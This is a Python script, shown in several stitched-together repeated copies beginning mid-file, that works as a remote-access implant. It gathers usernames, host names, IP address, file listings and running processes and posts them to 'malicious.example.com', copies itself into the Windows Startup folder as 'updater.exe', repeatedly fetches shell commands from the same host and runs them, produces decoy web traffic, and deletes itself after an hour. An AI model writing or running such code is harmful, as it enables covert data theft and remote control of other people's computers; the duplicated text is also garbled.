    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)

